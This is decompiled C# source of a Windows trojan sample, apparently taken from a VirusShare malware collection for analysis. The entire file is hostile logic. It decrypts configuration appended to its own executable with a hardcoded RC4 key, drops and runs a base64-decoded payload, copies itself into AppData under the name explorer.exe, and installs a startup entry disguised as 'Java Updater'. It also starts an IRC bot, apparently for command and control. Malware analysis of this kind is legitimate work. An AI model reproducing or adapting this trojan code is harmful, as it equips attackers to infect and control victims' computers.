﻿// Decompiled with JetBrains decompiler
// Type: Refx.Main
// Assembly: Refx, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5DD4C44F-C748-4813-B398-D3DE520CF41A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan.Win32.Fsysna.bezr-e553a7902dd2b2c973a97028cc8dc7f1bb82c18b1266abf90d2140ec0b5b3a01.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;

namespace Refx
{
  [StandardModule]
  internal sealed class Main
  {
    private static clsIRC ClsIRC = new clsIRC();

    [STAThread]
    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static void Main()
    {
      string[] strArray = Strings.Split(modRC4.rc4(modEOF.ReadEOFData(ref modEOF.SELF_EXE), "02112011"), "!@!");
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
      if (Information.UBound((Array) strArray) <= 4)
        return;
      if (Operators.CompareString(Strings.UCase(Strings.Right(modEOF.SELF_EXE, 12)), "EXPLORER.EXE", false) == 0)
      {
        modAuth.OWNER = strArray[5];
        Refx.Main.ClsIRC.SetIRCConfig(strArray[1], Conversions.ToInteger(strArray[2]), strArray[3], strArray[4]);
        Refx.Main.ClsIRC.StartIRC();
      }
      else
      {
        modBase64.DecodeData(strArray[6], "C:\\Run.exe");
        Process.Start("C:\\Run.exe");
        FileSystem.FileCopy(modEOF.SELF_EXE, folderPath + "\\explorer.exe");
        modRegister.StartUpInstall("Java Updater", folderPath + "\\explorer.exe", true);
        Process.Start(folderPath + "\\explorer.exe");
      }
    }
  }
}